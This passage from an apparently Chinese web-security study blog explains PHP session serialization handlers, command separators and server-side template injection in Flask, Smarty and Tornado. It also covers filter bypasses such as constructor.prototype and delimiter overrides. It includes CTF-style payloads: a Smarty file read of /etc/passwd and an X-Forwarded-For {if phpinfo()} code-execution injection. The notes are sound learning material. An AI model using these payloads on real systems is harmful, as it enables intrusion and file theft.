<th align="center">经过 serialize() 函数反序列处理的值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$_SESSION[‘name’]的键名：name</td>
<td align="center">|</td>
<td align="center">s:6:”harden”;</td>
</tr>
</tbody></table>
<h5 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h5><p>使用php_binary处理器，即<code>session.serialize_handler = php_binary</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment"># 为了方便ACSII显示，将键名设置为36个字符长度</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;namenamenamenamenamenamenamenamename&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;namenamenamenamenamenamenamenamename&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于三种方式<code>PHPSESSID</code>文件名都是一样的，这里只需要查看文件内容</p>
<p><a data-fancybox="gallery" data-src="https://image.3001.net/images/20220311/1646988665_622b0d79304714550f427.png!small"><img src="https://image.3001.net/images/20220311/1646988665_622b0d79304714550f427.png!small" alt="img"></a></p>
<table>
<thead>
<tr>
<th align="center">键名的长度对应的 ASCII 字符</th>
<th align="center">键名</th>
<th align="center">经过 serialize() 函数反序列处理的值.</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$</td>
<td align="center">namenamenamenamenamenamenamenamename</td>
<td align="center">s:6:”harden”;</td>
</tr>
</tbody></table>
<h5 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h5><p>使用php_binary处理器，即<code>session.serialize_handler = php_serialize</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>文件内容即经过 serialize() 函数反序列处理的数组，<code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;harden&quot;;&#125;</code></p>
<p><a data-fancybox="gallery" data-src="https://image.3001.net/images/20220311/1646988666_622b0d7a2a04733d2da9c.png!small"><img src="https://image.3001.net/images/20220311/1646988666_622b0d7a2a04733d2da9c.png!small" alt="img"></a></p>
<h2 id="十二、rce"><a href="#十二、rce" class="headerlink" title="十二、rce"></a>十二、rce</h2><blockquote>
<p>“<code>|</code>”:管道符，前面命令标准输出，后面命令的标准输入。例如：help |more</p>
<p>“<code>&amp;</code>” commandA <code>&amp;</code> commandB 先运行命令<code>A</code>，然后运行命令<code>B</code> </p>
<p>“<code>||</code>” commandA <code>||</code> commandB 运行命令<code>A</code>，如果失败则运行命令<code>B</code> </p>
<p>“<code>&amp;&amp;</code>” commandA <code>&amp;&amp;</code> commandB 运行命令<code>A</code>，如果成功则运行命令<code>B</code></p>
</blockquote>
<h2 id="十三、ssti"><a href="#十三、ssti" class="headerlink" title="十三、ssti"></a>十三、ssti</h2><blockquote>
<p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html">参考文章</a></p>
</blockquote>
<p>根据下图，推测不同的模板注入，然后使用不同的注入方法</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220903123146044.png"><img src="/Web-study/image-20220903123146044.png" alt="image-20220903123146044"></a></p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220903123047693.png"><img src="/Web-study/image-20220903123047693.png" alt="image-20220903123047693"></a></p>
<blockquote>
<p><a href="https://blog.csdn.net/weixin_51353029/article/details/111503731">原文链接1</a></p>
<p><a href="https://www.freebuf.com/articles/network/219913.html">原文链接2</a></p>
<p><u><strong>注，由于 转义内容 Hexo使用Nunjucks渲染帖子（较早的版本使用Swig，它们具有相似的语法）。用<code>&#123; &#123; &#125; &#125;</code>或<code>&#123; ％ ％ &#125;</code>包装的内容将被解析，并可能导致问题。您可以使用原始标签插件包装敏感内容。</strong></u></p>
<p>这里是把所有{  {}  }和 {  %% }，没有空格，替换成有空格的，才能上传博客</p>
</blockquote>
<h3 id="关于基于flask的SSTI漏洞的阶段学习小结："><a href="#关于基于flask的SSTI漏洞的阶段学习小结：" class="headerlink" title="关于基于flask的SSTI漏洞的阶段学习小结："></a>关于基于flask的SSTI漏洞的阶段学习小结：</h3><h4 id="SSTI的理解："><a href="#SSTI的理解：" class="headerlink" title="SSTI的理解："></a>SSTI的理解：</h4><p>SSTI和SQL注入原理差不多，都是因为对输入的字符串控制不足，把输入的字符串当成命令执行。</p>
<h4 id="SSTI引发的真正原因："><a href="#SSTI引发的真正原因：" class="headerlink" title="SSTI引发的真正原因："></a>SSTI引发的真正原因：</h4><p>render_template渲染函数的问题</p>
<h4 id="render-template渲染函数是什么："><a href="#render-template渲染函数是什么：" class="headerlink" title="render_template渲染函数是什么："></a>render_template渲染函数是什么：</h4><p>就是把HTML涉及的页面与用户数据分离开，这样方便展示和管理。当用户输入自己的数据信息，HTML页面可以根据用户自身的信息来展示页面，因此才有了这个函数的使用。</p>
<h4 id="render-template："><a href="#render-template：" class="headerlink" title="render_template："></a>render_template：</h4><p>渲染函数在渲染的时候，往往对用户输入的变量不做渲染，<br>即：{  {}  }在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{  {}  }包裹的内容当做变量解析替换。比如{  {1+1}  }会被解析成2。因此才有了现在的模板注入漏洞。往往变量我们使用{  {这里是内容}  }<br>真因为{  {}  }包裹的东西会被解析，因此我们就可以实现类似于SQL注入的漏洞</p>
<p><code>注入的思想：</code></p>
<blockquote>
<p>用函数不断调用我们要使用的命令如：file、read、open、ls等等命令，我们用这些来读取写入配置文件；</p>
</blockquote>
<h3 id="Smarty-SSTI利用"><a href="#Smarty-SSTI利用" class="headerlink" title="Smarty SSTI利用"></a>Smarty SSTI利用</h3><p>Smarty是基于PHP开发的，对于Smarty的SSTI的利用手段与常见的flask的SSTI有很大区别。</p>
<h4 id="漏洞确认"><a href="#漏洞确认" class="headerlink" title="漏洞确认"></a>漏洞确认</h4><p>一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。该题目的Smarty版本是3.1.30</p>
<h4 id="常规利用方式"><a href="#常规利用方式" class="headerlink" title="常规利用方式"></a>常规利用方式</h4><h5 id="php-php-标签"><a href="#php-php-标签" class="headerlink" title="{php}{&#x2F;php}标签"></a>{php}{&#x2F;php}标签</h5><p>Smarty支持使用{php}{&#x2F;php}标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但就该题目而言，使用{php}{&#x2F;php}标签会报错：</p>
<p><a data-fancybox="gallery" data-src="https://pic3.zhimg.com/80/v2-a24770cd727d793d93abd89d5025ad41_hd.jpg"><img src="https://pic3.zhimg.com/80/v2-a24770cd727d793d93abd89d5025ad41_hd.jpg" alt="v2-a24770cd727d793d93abd89d5025ad41_hd.j"></a></p>
<p>在Smarty3的官方手册里有以下描述:</p>
<blockquote>
<p>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</p>
</blockquote>
<p>该题目使用的是Smarty类，所以只能另寻它路。</p>
<h5 id="literal-标签"><a href="#literal-标签" class="headerlink" title="{literal} 标签"></a>{literal} 标签</h5><p>官方手册这样描述这个标签：</p>
<blockquote>
<p>{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p>
</blockquote>
<p>那么对于php5的环境我们就可以使用</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span>phpinfo();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>来实现PHP代码的执行，但这道题的题目环境是PHP7，这种方法就失效了。</p>
<h4 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h4><p>通过self获取Smarty类再调用其静态方法实现文件读写被网上很多文章采用。</p>
<p>Smarty类的getStreamVariable方法的代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)</span>&#123;        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;            <span class="keyword">while</span>  (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;            &#125;            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);            <span class="keyword">return</span> <span class="variable">$_result</span>;        &#125;        <span class="variable">$smarty</span> =  <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;smarty) ? <span class="variable language_">$this</span>-&gt;smarty : <span class="variable language_">$this</span>;        <span class="keyword">if</span>  (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;            <span class="keyword">throw</span> <span class="keyword">new</span>  <span class="title class_">SmartyException</span>(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);        &#125; <span class="keyword">else</span> &#123;            <span class="keyword">return</span> <span class="literal">null</span>;        &#125;    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法，很多文章里给的payload都形如：{self::getStreamVariable(“file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd”)}。然而使用这个payload会触发报错如下：</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">Fatal error: Uncaught --&gt; Smarty Compiler: Syntax error <span class="keyword">in</span> template  <span class="string">&quot;string:&lt;meta http-equiv=&quot;</span>...<span class="string">&quot;&gt;Current  IP:&#123;self::getStreamVariable(‘file:///etc/passwd’)&#125;&quot;</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="string">&#x27;self&#x27;</span>  <span class="keyword">is</span> <span class="literal">undefined</span> <span class="keyword">or</span> <span class="keyword">not</span> allowed <span class="keyword">by</span> security setting &lt;-- thrown <span class="keyword">in</span>  /<span class="keyword">var</span>/www/html/smarty/libs/sysplugins/smarty_internal_templatecompilerbase.php <span class="literal">on</span> line <span class="number">12</span></span><br></pre></td></tr></table></figure>

<p>可见这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p>
<h5 id="if-标签"><a href="#if-标签" class="headerlink" title="{if}标签"></a>{if}标签</h5><p>官方文档中看到这样的描述：</p>
<blockquote>
<p>Smarty的{if}条件判断和PHP的if 非常相似，只是增加了一些特性。每个{if}必须有一个配对的{&#x2F;if}. 也可以使用{else} 和 {elseif}. </p>
<p>全部的PHP条件表达式和函数都可以在if内使用，<br>如*||*, or, &amp;&amp;, and, is_array(), 等等</p>
</blockquote>
<p>既然全部的PHP函数都可以使用，那么我们是否可以利用此来执行我们的代码呢？</p>
<p>将XFF头改为{if phpinfo()}{&#x2F;if}，可以看到题目执行了phpinfo()</p>
<p><a data-fancybox="gallery" data-src="https://pic4.zhimg.com/80/v2-bddead1f721c42eed678d9db9527c0e7_hd.jpg"><img src="https://pic4.zhimg.com/80/v2-bddead1f721c42eed678d9db9527c0e7_hd.jpg" alt="v2-bddead1f721c42eed678d9db9527c0e7_hd.j"></a></p>
<p>用同样的方法可以轻松获得flag</p>
<p>题目漏洞代码</p>
<p>通过getshell之后的文件读取，本题中引发SSTI的代码简化后如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">require_once</span>(<span class="string">&#x27;./smarty/libs/&#x27;</span> . <span class="string">&#x27;Smarty.class.php&#x27;</span>);<span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();<span class="variable">$ip</span> =  <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;string:&quot;</span>.<span class="variable">$ip</span>);&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里使用字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI。</p>
<h3 id="Tornado-SSTI利用"><a href="#Tornado-SSTI利用" class="headerlink" title="Tornado SSTI利用"></a>Tornado SSTI利用</h3><p><strong>tornado是用Python编写的Web服务器兼Web应用框架</strong>，简单来说就是用来生成模板的东西。和Python相关，和模板相关</p>
<blockquote>
<p> Tornado模板支持控制语句和表达式。</p>
<p> 控制语句被{ % % }, e.g. { % if len(items) &gt; 2 %}</p>
<p> 表达式被{ { } }, e.g. { { items[0] } }.</p>
</blockquote>
<p><strong>render()<strong>是tornado里的函数，</strong>可以生成html模板。是一个渲染函数</strong>，就是一个公式，<strong>能输出前端页面的公式。</strong></p>
<p><strong>Tornado</strong>框架的附属文件<strong>handler.settings</strong>中存在<strong>cookie_secret</strong></p>
<p><strong>Handler</strong>这个对象，<u>Handler指向的处理当前这个页面的RequestHandler对象</u></p>
<blockquote>
<p><code>RequestHandler</code>中并没有settings这个属性，与RequestHandler关联的Application对象（Requestion.application）才有setting这个属性</p>
<p>handler 指向RequestHandler</p>
<p>而RequestHandler.settings又指向self.application.settings</p>
<p>所有handler.settings就指向RequestHandler.application.settings了！</p>
</blockquote>
<h3 id="绕过过滤-1"><a href="#绕过过滤-1" class="headerlink" title="绕过过滤"></a>绕过过滤</h3><h4 id="proto-绕过"><a href="#proto-绕过" class="headerlink" title="__proto__绕过"></a><code>__proto__</code>绕过</h4><blockquote>
<h4 id="proto-被过滤，用constructor-prototype绕过"><a href="#proto-被过滤，用constructor-prototype绕过" class="headerlink" title="__proto__被过滤，用constructor.prototype绕过"></a><code>__proto__</code>被过滤，用constructor.prototype绕过</h4><blockquote>
<p>在JavaScript中，每个对象都有一个名为 <code>__proto__</code> 的内置属性，它指向该对象的原型。对象的原型是另一个对象，它有自己的 <code>__proto__</code> 属性，指向它的原型，这样就形成了一条链，称为原型链。使用 <code>__proto__</code> 属性可以访问和修改对象的原型。</p>
<p>在某些情况下，开发人员可能希望过滤掉对象的 <code>__proto__</code> 属性，以增强安全性或避免潜在的问题。但是，这并不意味着通过其他方式就无法访问对象的原型了。</p>
<p><code>constructor.prototype</code> 是一种访问对象原型的替代方法。当创建一个函数时，会自动创建一个名为 <code>prototype</code> 的属性，并将其设置为一个空对象。当使用该函数作为构造函数创建新对象时，该对象的 <code>__proto__</code> 属性将被设置为构造函数的 <code>prototype</code> 属性的值。因此，可以使用 <code>constructor.prototype</code> 访问该对象的原型，而无需使用 <code>__proto__</code> 属性。</p>
<p>尽管 <code>constructor.prototype</code> 可以绕过对 <code>__proto__</code> 的过滤，但它本质上与 <code>__proto__</code> 是相同的，因此也可能存在潜在的安全问题，需要在代码编写时进行注意。</p>
</blockquote>
</blockquote>
<h4 id="分隔符绕过"><a href="#分隔符绕过" class="headerlink" title="分隔符绕过"></a>分隔符绕过</h4><blockquote>
<p>利用模板渲染参数，将delimiter分割参数渲染覆盖，使得原有的标签从<code>&lt;%=</code>变成<code>&lt;?=</code>【<code>http://xx/?delimiter=?</code>】，故而正则匹配对<code>&lt;%=</code>的限制就绕过了</p>
</blockquote>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
</search>
